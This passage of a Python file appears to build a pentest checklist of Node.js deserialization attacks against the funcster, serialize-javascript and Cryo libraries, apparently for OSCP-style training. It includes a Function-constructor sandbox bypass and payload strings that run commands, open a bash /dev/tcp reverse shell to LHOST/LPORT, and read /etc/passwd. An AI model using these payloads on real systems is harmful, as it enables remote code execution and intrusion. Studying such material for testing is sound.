                        'notes': 'funcster restricts access to built-in objects (console, require). Bypass: this.constructor.constructor() = Function constructor → regain global access. Auto-execute with () at end. Serialized format: {__js_function: "code"}. deepDeserialize() triggers execution. Source: https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/'
                    }
                },
                {
                    'id': f'nodejs-serialize-javascript-{port}',
                    'name': 'Test serialize-javascript Deserialization',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test for serialize-javascript library RCE via eval() deserialization',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MANUAL'],
                        'success_indicators': [
                            'eval() used for deserialization',
                            'RCE via function serialization',
                            'Command executed'
                        ],
                        'failure_indicators': [
                            'serialize-javascript not in use',
                            'Custom safe deserializer implemented',
                            'eval() not used'
                        ],
                        'next_steps': [
                            'Use IIFE syntax for auto-execution',
                            'Test with child_process.exec()',
                            'Upgrade to reverse shell'
                        ],
                        'alternatives': [
                            'Payload 1 - Auto-exec: "function(){ require(\'child_process\').exec(\'id\') }()"',
                            'Payload 2 - Reverse shell: "function(){ require(\'child_process\').exec(\'bash -c "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"\') }()"',
                            'Payload 3 - File exfil: "function(){ console.log(require(\'fs\').readFileSync(\'/etc/passwd\',\'utf8\')) }()"',
                            'Detection: Look for serialized functions in requests',
                            'Library: npm install serialize-javascript'
                        ],
                        'notes': 'serialize-javascript serializes functions but does NOT deserialize. Docs suggest: eval("(" + serializedData + ")") for deserialization. If app uses eval(), direct RCE. Exploit: Send IIFE (function with () at end) for auto-exec. No special flag needed. Source: https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/'
                    }
                },
                {
                    'id': f'nodejs-cryo-{port}',
                    'name': 'Test Cryo Library Deserialization',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test for Cryo library deserialization vulnerabilities',
                        'tags': ['OSCP:LOW', 'EXPLOIT', 'RESEARCH'],
                        'success_indicators': [
                            'Cryo deserialization exploitable',
                            'RCE achieved via Cryo.parse()',
                            'Object reconstruction attack successful'
                        ],
                        'failure_indicators': [
                            'Cryo not in use',
                            'Secure deserialization configured',
                            'Input validation blocks exploit'
                        ],
                        'next_steps': [
                            'Read detailed exploit techniques in references',
                            'Test with malicious object payloads',
                            'Combine with prototype pollution'
                        ],
                        'alternatives': [
                            'Reference 1: https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/',
                            'Reference 2: https://hackerone.com/reports/350418',
                            'Detection: Look for Cryo.stringify/parse in client code',
                            'Library: npm install cryo'
                        ],
                        'notes': 'Cryo library allows serialization with circular references. Vulnerable to deserialization attacks. Check HackerOne report #350418 for PoC. Less common than node-serialize but still found in legacy apps. Detection: Search for Cryo.parse() or Cryo.fromJSON() in source.'
                    }
                }
            ]
        })

        return tasks
